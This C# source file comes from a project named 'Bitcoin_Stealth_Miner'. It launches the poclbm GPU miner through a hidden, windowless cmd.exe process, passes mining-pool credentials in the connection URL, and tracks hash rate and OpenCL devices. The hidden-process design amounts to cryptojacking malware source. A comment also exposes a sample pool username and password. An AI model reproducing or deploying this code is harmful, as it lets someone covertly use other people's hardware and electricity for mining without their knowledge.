using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Bitcoin_Stealth_Miner {
    public static class Miner {
        //sample for query: poclbm.exe --device=0 --platform=0 --verbose -r1 elibelash.elibelash:qweqwe@api2.bitcoin.cz:8332 
         

        #region Properties

        private static string _minerAppTarget = "poclbm.exe";
        private static string _minerLocation = "\\";
        private const string POCLBM_DEVICE_MATCH_PATTERN = @"^\[(?<id>\d+)\]\s+(?<device>.*)\b(?:.*)?$";
        private const string POCLBM_HASH_MATH_PATTERN = @"^.*\s\[(?<hps>\d+\.\d+)\s[MmKkTt]H/s.*$";
        private static readonly Regex _regex_hash = new Regex(POCLBM_HASH_MATH_PATTERN);
        /// <summary>
        /// The location of the software directory. Empty by default, meaning the it is in the root program.
        /// </summary>
        public static string MinerLocation {
            get { return _minerLocation; }
            set {
                _minerLocation = value ?? string.Empty;
                if (_minerLocation.Length == 0 || _minerLocation.Last() != '\\')
                    _minerLocation += "\\";
            }
        }

        /// <summary>
        /// The application filename, by default "poclbm.exe"
        /// </summary>
        public static string MinerAppTarget {
            get { return _minerAppTarget; }
            set { _minerAppTarget = value; }
        }

        /// <summary>
        /// Returns a filename to the miner application
        /// </summary>
        public static FileInfo MinerFile {
            get { return new FileInfo((MinerLocation) + MinerAppTarget); }
        }

        /// <summary>
        /// Returns a filename to the miner application
        /// </summary>
        public static string MinerFilePath {
            get { return MinerLocation + MinerAppTarget; }
        }

        /// <summary>
        /// Wether the process of the miner is open. for working status use <see cref="IsMining"/>.
        /// </summary>
        public static bool IsOpen {
            get { return _miner != null; }
        }

        /// <summary>
        /// Is currently mining
        /// </summary>
        public static bool IsMining {
            get { return IsOpen && MhashPerSecond > 0; }
        }

        /// <summary>
        /// Mega hash per second that is being processed by the miner, if inactive - it is 0. (use IsMining prop for this purpose)
        /// </summary>
        public static double MhashPerSecond {
            get { return _megaHashPerSecond; }
            private set { if (!_props_locked) _megaHashPerSecond = value; }
        }
        
        private static Process _miner = null; //the miner proc

        /// <summary>
        /// What is the system architecture, 64 or 32 bit. (as int)
        /// </summary>
        public static readonly int SystemBits;

        private static double _megaHashPerSecond;
        private static bool _props_locked = false; //prevent _megaHashPerSecond writing till started again.
        private static bool _cancelled = false; //thread exiter incase of stop.
        private static StreamReader _redirected_reader = null;
        private static StreamWriter _redirected_writer = null;

        static Miner() {
            SystemBits = string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")) ? 32 : 64;
        }

        #endregion

        #region Methods
        public static void Start(string url, ushort port, string username, string password, bool hide = true ,string arguments = "-r1") {
            if (IsOpen)
                throw new InvalidOperationException("Unable to start because there is a miner already open");
            _props_locked = false;
            url = url.Replace("http://", "");
            var args = string.Format("http://{0}:{1}@{2}:{3}", username, password, url, port);
            var devices = GatherDevices();
            foreach (var d in devices) 
                Console.WriteLine("[{0}]{1}", d.Key, d.Value);

            _miner = new Process();
            var StartInfo = new ProcessStartInfo {FileName = "cmd.exe",
                                                    WindowStyle = ProcessWindowStyle.Hidden,
                                                    CreateNoWindow = true,
                                                    RedirectStandardInput = true, 
                                                    RedirectStandardOutput = true, 
                                                    UseShellExecute = false};
            _miner.StartInfo = StartInfo;
            _miner.Start();

            _redirected_reader = _miner.StandardOutput;
            _redirected_writer = _miner.StandardInput;
            Task.Run(() => reader());
            _redirected_writer.WriteLine("@echo off");
            _redirected_writer.WriteLine("cd " + AppDomain.CurrentDomain.BaseDirectory + MinerLocation); //the command you wish to run.....
            _redirected_writer.WriteLine("{0} {1} {2}", MinerAppTarget, arguments, args);
        }

        public static void Stop() {
            _miner.Close();
            _redirected_reader.Dispose();
            _redirected_reader = null;
            _redirected_writer.Dispose();
            _redirected_writer = null;
            _miner.Dispose();
            _miner = null;
            _megaHashPerSecond = -1;
            _props_locked = true; //prevents _megaHashPerSecond writing till started again.
            _cancelled = true; //reader thread exit
        }

        private static void reader() { //reads the output of 
            var r = _redirected_reader;
            try {
                while (true) {
                    while (r.EndOfStream == false) {
                        var l = r.ReadLine();
                        if (string.IsNullOrEmpty(l) || l.Contains("    ")) continue; //filtering un needed messages
                        var m = _regex_hash.Match(l);
                        if (m.Success)
                            MhashPerSecond = /* "Miner - "+ */double.Parse(m.Groups["hps"].Value)/*+" Mhash/s"*/;
                        Console.WriteLine(l.Replace("\t", ""));

                    }
                    if (r.Peek() == -1)
                        Thread.Sleep(500);
                    if (_cancelled) { //exiter
                        _cancelled = false;
                        return;
                    }
                }
            } catch (ObjectDisposedException) {
                //thrown when stop has been called
            }
        }

        /// <summary>
        /// Gathers the devices that can mine (supports for OpenCL) using poclbm and returns a dic of the miner id and name.
        /// </summary>
        public static Dictionary<int, string> GatherDevices() {
            var _openCLDevices = new Dictionary<int, string>();
            using (var poclbm = new Process {StartInfo = new ProcessStartInfo(MinerFilePath) {RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden}}) {
                poclbm.Start();
                var poclbmOutput = poclbm.StandardOutput; //binds the perl program console to this streamer
                
                while (!poclbmOutput.EndOfStream) {
                    string line = poclbmOutput.ReadLine();
                    if (string.IsNullOrEmpty(line)) continue;
                    if (line.Equals("No devices specified, using all GPU devices")) break; //end of showing devices
                    var m = Regex.Match(line, POCLBM_DEVICE_MATCH_PATTERN);
                    if (m.Success) //if it matches to the regex
                        _openCLDevices.Add(int.Parse(m.Groups["id"].Value), m.Groups["device"].Value);
                }
                poclbm.Close();
            }
            return _openCLDevices;
        }
        #endregion

    }
}
